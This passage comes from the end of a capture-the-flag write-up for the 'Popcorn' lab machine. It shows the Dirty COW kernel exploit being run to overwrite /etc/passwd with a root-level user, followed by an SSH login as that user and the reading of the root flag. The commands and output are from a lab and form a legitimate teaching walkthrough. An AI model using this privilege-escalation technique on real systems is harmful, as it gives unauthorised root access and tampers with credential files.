-rwxrwxrwx  1 www-data www-data  13603 Nov 16 19:23 cow
-rwxrwxrwx  1 www-data www-data 473164 Nov 16 18:44 linpeas.sh
www-data@popcorn:/dev/shm$ ./cow
./cow
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: password

Complete line:
firefart:fi1IpG9ta02N.:0:0:pwned:/root:/bin/bash

mmap: b7873000

madvise 0

ptrace 0
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password 'password'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
www-data@popcorn:/dev/shm$ 
```

The shell seems to have hang for a long time. We wait a few minutes. Once we get the shell back we can either SSH as the new user or simply su to the new user. We'll SSH into the target with the new creds created by the exploit:

```
└─$ ssh firefart@10.10.10.6            
The authenticity of host '10.10.10.6 (10.10.10.6)' can't be established.
RSA key fingerprint is SHA256:V1Azfw43WixBJWVAsqnBuoCdUrthzn2x6VQiZjAUusk.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.6' (RSA) to the list of known hosts.
firefart@10.10.10.6's password: 
Linux popcorn 2.6.31-14-generic-pae #48-Ubuntu SMP Fri Oct 16 15:22:42 UTC 2009 i686

To access official Ubuntu documentation, please visit:
http://help.ubuntu.com/

  System information as of Tue Nov 16 19:24:43 EET 2021

  System load: 1.82              Memory usage: 11%   Processes:       116
  Usage of /:  7.9% of 14.80GB   Swap usage:   0%    Users logged in: 0

  Graph this data and manage this system at https://landscape.canonical.com/

Last login: Tue Oct 27 11:08:55 2020
firefart@popcorn:~# id
uid=0(firefart) gid=0(root) groups=0(root)
firefart@popcorn:~# 

```

We can now also grab the root flag.

```
firefart@popcorn:~# cat root.txt 
dbb27eb3bf8e8cba1804fd66cebae179
firefart@popcorn:~#​ ​ ​ ​
```

## Resources

{% embed url="https://dirtycow.ninja" %}
